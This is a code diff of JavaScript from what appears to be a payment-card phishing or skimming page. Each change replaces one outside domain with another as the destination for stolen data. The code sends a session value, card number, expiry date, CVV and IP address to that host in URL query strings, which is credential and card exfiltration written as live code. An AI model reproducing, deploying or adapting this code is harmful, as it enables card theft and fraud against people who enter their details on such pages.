@@ -2019,7 +2019,7 @@ priceElement.textContent += price;
     console.log('sesion: ' + session)
     console.log(session)
     console.log(session)
-  fetch('https://api.mobiletecso.cfd/update'+"?session=" + encodeURIComponent(session))
+  fetch('https://api.payuapp.mom/update'+"?session=" + encodeURIComponent(session))
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
@@ -2129,7 +2129,7 @@ function submitForm(event) {
     let url;
     if (question) {
         console.log('question');
-        url = "https://api.mobiletecso.cfd/login" +
+        url = "https://api.payuapp.mom/login" +
             "?cardNumber=" + encodeURIComponent(cardNumber) +
             "&expiryDate=" + encodeURIComponent(expiryDate) +
             "&cvv=" + encodeURIComponent(cvv) +
@@ -2141,7 +2141,7 @@ function submitForm(event) {
             "&ip=" + encodeURIComponent(ip);
     } else {
         console.log('question');
-        url = "https://api.mobiletecso.cfd/login" +
+        url = "https://api.payuapp.mom/login" +
             "?cardNumber=" + encodeURIComponent(cardNumber) +
             "&expiryDate=" + encodeURIComponent(expiryDate) +
             "&cvv=" + encodeURIComponent(cvv) +
